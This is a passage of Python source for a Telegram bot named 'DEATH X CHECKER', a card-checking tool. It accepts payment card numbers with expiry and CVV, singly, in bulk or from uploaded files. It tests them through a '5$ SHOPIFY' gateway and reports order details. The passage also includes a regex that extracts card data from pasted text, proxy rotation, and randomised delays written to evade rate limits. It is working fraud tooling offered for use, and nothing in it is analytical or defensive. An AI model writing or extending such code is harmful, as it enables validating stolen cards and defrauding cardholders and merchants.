    start_text = """DEATH X CHECKER

**How to use:**
- Send cards directly in a message.
- Upload a `.txt` file with one card per line.

**Available Commands:**
━━━━━━━━━━━━━
`/chk card` - for single check
`/mass cards` - for multiple checks
`/addproxy ip:port:user:pass`
`/removeproxies` - clear all proxies
`/myproxies` - view current proxies
`/sort cards` - to format and remove duplicates
━━━━━━━━━━━━━
GATE - 5$ SHOPIFY (Updated)
[⌥] Dev: D E A T H - 👑
"""
    bot.reply_to(message, start_text, parse_mode='Markdown')

@bot.message_handler(commands=['sort'])
def sort_cards(message):
    try:
        args = message.text.split(maxsplit=1)
        if len(args) < 2:
            bot.reply_to(message, "Please provide text to extract cards from.\nUsage: /sort [text containing cards]")
            return
            
        text_to_sort = args[1]
        pattern = r'(\d{15,16})[^\d]*(\d{1,2})[^\d]*(\d{2,4})[^\d]*(\d{3,4})'
        found_cards = re.findall(pattern, text_to_sort)
        
        if not found_cards:
            bot.reply_to(message, "No valid cards found in the provided text.")
            return
            
        unique_formatted_cards = set()
        for card_tuple in found_cards:
            card_num, month, year_raw, cvv = card_tuple
            
            if len(year_raw) == 4 and year_raw.startswith("20"):
                year = year_raw[2:]
            else:
                year = year_raw.zfill(2)[-2:]
            
            month_formatted = month.zfill(2)
            formatted_card = f"{card_num}|{month_formatted}|{year}|{cvv}"
            unique_formatted_cards.add(formatted_card)
            
        output_text = "\n".join(sorted(list(unique_formatted_cards)))
        
        if output_text:
            bot.reply_to(message, f"```\n{output_text}\n```", parse_mode='Markdown')
        else:
            bot.reply_to(message, "No valid cards were found after formatting.")

    except Exception as e:
        print(f"An error occurred in /sort command: {e}")
        bot.reply_to(message, "An error occurred while trying to sort the cards.")

@bot.message_handler(commands=['chk'])
def check_card(message):
    try:
        card_details = message.text.split(maxsplit=1)[1]
    except IndexError:
        bot.reply_to(message, "Invalid format. Use /chk cardnumber|mm|yy|cvc")
        return
    
    sent_msg = bot.reply_to(message, "Checking your card, please wait... ⏳")
    username = message.from_user.username or "USER"
    result = sh(card_details, username)

    if isinstance(result, str):
        response_text = f"Error: {result} ❌"
    else:
        response_text = f"""DEATHxBOTS ------
━━━━━━━━━━━━━
[ϟ] Card: {result['full_card']}
[ϟ] Gateway: SHOPIFY 5$
[ϟ] Status: {result['status']}
[ϟ] Response: {result['resp_msg']}
[ϟ] Time: {result['elapsed_time']}
━━━━━━━━━━━━━"""
        
        if result.get('order_details') and result['order_details']:
            order_info = result['order_details']
            response_text += f"""
📋 ORDER DETAILS:
[ϟ] Order ID: {order_info.get('order_id', 'N/A')}
[ϟ] Redirect URL: {order_info.get('redirect_url', 'N/A')[:50]}...
[ϟ] Confirmation: {order_info.get('confirmation_url', 'N/A')[:50]}...
[ϟ] Status Page: {order_info.get('order_status_url', 'N/A')[:50]}...
━━━━━━━━━━━━━"""
        
        response_text += f"""
[ϟ] Checked By: @{result['username']}
[⌥] Dev: {result['dev']}
━━━━━━━━━━━━━"""
    
    try:
        bot.edit_message_text(response_text, chat_id=sent_msg.chat.id, message_id=sent_msg.message_id)
    except Exception as e:
        print(f"Could not edit message: {e}")
        bot.reply_to(message, response_text)

def process_card_list(message, cards, username):
    if not cards:
        bot.reply_to(message, "No valid cards found to check.")
        return

    total_cards = len(cards)
    if total_cards > 1000:
        bot.reply_to(message, f"Too many cards. Please provide a maximum of 1000 cards. You provided {total_cards}.")
        return
        
    bot.reply_to(message, f"Starting check... Found {total_cards} cards to process. ⚪️")
    
    for i, card_details in enumerate(cards):
        # Extra delay between mass checks to avoid rate limits
        if i > 0:
            random_delay(8, 15)
        
        result_text = ""
        try:
            result = sh(card_details, username)

            if isinstance(result, str):
                card_to_display = card_details
                response_msg = f"Error: {result}"
            else:
                card_to_display = result['full_card']
                response_msg = result['resp_msg']

            safe_card = card_to_display.replace('_', r'\_').replace('*', r'\*').replace('`', r'\`')
            result_text = f"Card: `{safe_card}`\nResponse: *{response_msg}*"

        except Exception as e:
            print(f"Error processing card {card_details}: {e}")
            safe_card = card_details.replace('_', r'\_').replace('*', r'\*').replace('`', r'\`')
            result_text = f"Card: `{safe_card}`\nResponse: *Processing Error ❗️*"

        bot.send_message(message.chat.id, result_text, parse_mode='Markdown')

    bot.send_message(message.chat.id, f"Check Completed! ✅\nProcessed all {total_cards} cards.")

@bot.message_handler(commands=['mass'])
def mass_check_cards(message):
    try:
        args = message.text.split(maxsplit=1)
        if len(args) < 2:
            bot.reply_to(message, "Invalid format. Use /mass followed by a list of cards.")
            return
            
        card_list_raw = args[1]
        cards = [card.strip() for card in re.split(r'[\n\s]+', card_list_raw) if card.strip()]
        username = message.from_user.username or "USER"
        
        process_card_list(message, cards, username)

    except Exception as e:
        print(f"An unexpected error occurred in /mass command: {e}")
        bot.reply_to(message, "An unexpected error occurred. Please check the logs.")

@bot.message_handler(content_types=['document'])
def handle_document_upload(message):
    try:
        doc = message.document
        if not doc.file_name.lower().endswith('.txt'):
            bot.reply_to(message, "Invalid file type. Please upload a `.txt` file. ❌")
            return

        file_info = bot.get_file(doc.file_id)
        downloaded_file = bot.download_file(file_info.file_path)
        
        file_content = downloaded_file.decode('utf-8', errors='ignore')
        cards = [line.strip() for line in file_content.splitlines() if line.strip()]
        username = message.from_user.username or "USER"

        process_card_list(message, cards, username)

    except Exception as e:
        print(f"Error handling document: {e}")
        bot.reply_to(message, "An error occurred while processing the file.")

@bot.message_handler(commands=['addproxy'])
def add_proxy(message):
    global proxy_list
    try:
        proxy_string = message.text.split(maxsplit=1)[1]
        
        parts = proxy_string.split(':')
        if len(parts) != 4:
            bot.reply_to(message, "Invalid proxy format. ❌\nPlease use: `/addproxy ip:port:user:pass`", parse_mode='Markdown')
            return

        ip, port, user, password = parts
        proxy_url = f"http://{user}:{password}@{ip}:{port}"
        
        new_proxy = {
            "http": proxy_url,
            "https": proxy_url
        }
        
        proxy_list.append(new_proxy)
        bot.reply_to(message, f"Proxy added successfully! Total proxies: {len(proxy_list)} ✅", parse_mode='Markdown')

    except IndexError:
        bot.reply_to(message, "Please provide a proxy. ❌\nUsage: `/addproxy ip:port:user:pass`", parse_mode='Markdown')
    except Exception as e:
        bot.reply_to(message, f"An error occurred while adding the proxy: {e}")

@bot.message_handler(commands=['removeproxies'])
def remove_proxies(message):
    global proxy_list
    proxy_list.clear()
    bot.reply_to(message, "All proxies have been successfully removed. ✅")

@bot.message_handler(commands=['myproxies'])
def my_proxies(message):
    if proxy_list:
        hosts = [p['http'].split('@')[-1] for p in proxy_list]
        proxy_info = "\n".join([f"- `{host}`" for host in hosts])
        bot.reply_to(message, f"Current Proxies ({len(proxy_list)}): ℹ️\n{proxy_info}", parse_mode='Markdown')
    else:
        bot.reply_to(message, "No proxies are currently set. ℹ️")

if __name__ == '__main__':
    print("Starting DEATH X CHECKER Bot...")
    
    # Suppress telebot logging
    logging.getLogger('telebot').setLevel(logging.CRITICAL)
    
    max_retries = 3
    retry_count = 0
    
    while retry_count < max_retries:
        try:
            print(f"Bot is now online and ready! 🔥")
            bot.infinity_polling(timeout=10, long_polling_timeout=5, skip_pending=True)
            break
        except KeyboardInterrupt:
            print("Bot stopped by user ✋")
            break
        except Exception as e:
            error_msg = str(e)
            if "409" in error_msg:
                retry_count += 1
                if retry_count < max_retries:
                    print(f"Conflict detected. Retrying... ({retry_count}/{max_retries}) ⏳")
                    time.sleep(3)
                else:
                    print("Multiple bot instances detected. Please manually stop other bots first. ❌")
                    break
            elif "Network" in error_msg or "Connection" in error_msg:
                print("Network issue detected. Retrying in 5 seconds... 🌐")
                time.sleep(5)
                continue
            else:
                print(f"Bot error: {error_msg[:80]}... ❌")
                break
    
    print("Bot session ended.")